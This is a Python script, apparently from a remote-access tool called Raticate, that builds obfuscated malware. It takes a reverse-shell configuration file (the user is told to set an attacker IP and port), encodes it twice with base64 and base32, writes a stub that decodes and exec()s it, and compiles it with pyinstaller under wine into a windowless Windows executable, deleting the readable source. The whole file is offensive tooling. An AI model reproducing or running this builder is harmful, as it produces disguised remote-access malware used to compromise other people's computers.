import base64
from colorama import Fore
import os
import time

os.system("clear")
print (Fore.WHITE + """
    ,           ,
                \
  ((__-^^-,-^^-__))
   `-_---' `---_-'
    <__|o` 'o|__>
       \  `  
        ): :(
        :o_o:
         "-"   [pb]

----------------------------------------------



""")


payloa = input (Fore.RED + "[*] Enter Payload name : ")
print (Fore.WHITE +"[" +Fore.GREEN +"*" +  Fore.WHITE +"]" + Fore.WHITE +  " Your Payload Name is : " + payloa)
pat = input (Fore.RED + "[*] Enter Paylaod Path : ")
print (Fore.WHITE +"[" +Fore.GREEN +"*" +  Fore.WHITE +"]" + Fore.WHITE +  " Your Payload Path Is : " + pat)
print ("")
print (Fore.GREEN + "info : " + Fore.WHITE + "Please Edit Your IP And Your Port in This Config File : " + Fore.RED + "/usr/share/Raticate/config/payload.py")
print ("")
print ("")
input (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE +  " When You Are Done Click" + Fore.GREEN + " [Enter]")





file = open("/usr/share/Raticate/config/payload.py","r+")
creds = file.read()

hash05 = creds.encode('UTF-8')
hash07 = base64.b64encode(hash05)
hash1 = hash07.decode('UTF-8')


hash15 = hash1.encode('UTF-8')
hash17 = base64.b32encode(hash15)
hash2 = hash17.decode('UTF-8')


############I Dont Know Why Base16 Not Working##
#hash25 = creds.encode('UTF-8')                #
#hash27 = base64.b16encode(hash25)             #
#hash3 = hash07.decode('UTF-8')                #
################################################


payloadd = (pat + "/" + payloa + ".py")
payloaddexe = (pat + "/" + payloa + ".exe")

final = open(payloadd,"w+")
final.write("import base64")
final.write("\n")
final.write("x = '")
final.write(hash2)
final.write("'")
final.write("\n")
final.write("firstd = base64.b32decode(x)")
final.write("\n")
final.write("twod = firstd.decode('UTF-8')")
final.write("\n")
final.write("final = base64.b64decode(twod)")
final.write("\n")
final.write("finall = final.decode('UTF-8')")
final.write("\n")
final.write("exec(finall)")
final.close()

print (payloadd)

os.system("clear")

print (Fore.WHITE +"[" +Fore.GREEN +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Building Python shell ")
time.sleep(3)
print (Fore.WHITE +"[" +Fore.GREEN +"*" +  Fore.WHITE +"]" + Fore.WHITE +  " Success ")
time.sleep(2)

os.system("clear")

print (Fore.WHITE +"[" +Fore.GREEN +"*" +  Fore.WHITE +"]" + Fore.WHITE +  "  Building exe File ")
time.sleep(3)

wine = ("wine cmd /k 'pyinstaller --onefile -y -w " + payloadd + " && exit" + "'")
os.system(wine)

removing = ("rm -rf "+ payloadd)
os.system(removing)
os.system("clear")
print (Fore.WHITE +"[" +Fore.GREEN +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Finding Your exe Payload")

print("")

finding = ("find / -name " + payloa+ ".exe")

os.system(finding)

